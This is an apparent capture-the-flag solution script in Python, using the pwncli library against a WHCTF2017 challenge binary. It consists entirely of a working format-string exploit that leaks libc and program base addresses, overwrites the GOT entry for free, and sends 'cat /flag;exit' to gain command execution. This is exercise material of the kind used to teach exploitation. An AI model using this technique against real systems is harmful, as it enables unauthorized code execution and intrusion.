#!/usr/bin/python3
from pwncli import *

cli_script()

p:tube = gift['io']
elf:ELF = gift['elf']
libc: ELF = gift['libc']



def fmt(data):
    p.sendlineafter("Input Your Code:\n", "1")
    p.sendafter("Welcome To WHCTF2017:\n", data)
    p.recvuntil("Your Input Is :")
    m = p.recvline(0)
    info(f"Get msg: {m}")
    return m


def leak(data):
    p.sendlineafter("Input Your Code:\n", "2")
    p.sendafter("Input Your Name:\n", data)


payload = flat({
    0x3e8:"bb"+",%396$p,%397$p,"
}, length=0x438)

m = fmt(payload)

ma = m.split(b",")
log_ex(f"{ma}")

libc_base = int16(ma[-3].decode()) - 0x20830
log_libc_base_addr(libc_base)
libc.address = libc_base


code_base = int16(ma[-4].decode()) -0xda0
log_code_base_addr(code_base)
elf.address = code_base

leak("a"*0x100)

free_addr = libc.sym.free
free_got = elf.got.free

log_ex(f"free_addr: {hex(free_addr)}  free_got: {hex(free_got)}")

lo2_addr = free_addr & 0xffff

"""
这里的0xaa2和0x402都是调试出来的，我也不知道为啥是这个值
"""
payload = 0x3e8 * b"a"+ b"b"*2+"%{}c%{}$hn".format(lo2_addr+0xaa2, 133).ljust(14, "x").encode()+p64_ex(free_got)
fmt(payload)
sleep(2)
lo2_addr = (free_addr >> 16) & 0xffff
payload = 0x3e8 * b"a"+ b"b"*2+"%{}c%{}$hn".format(lo2_addr-0x402, 133).ljust(14, "x").encode()+p64_ex(free_got+2)
fmt(payload)
sleep(2)
leak("cat /flag;exit\x00")

p.interactive()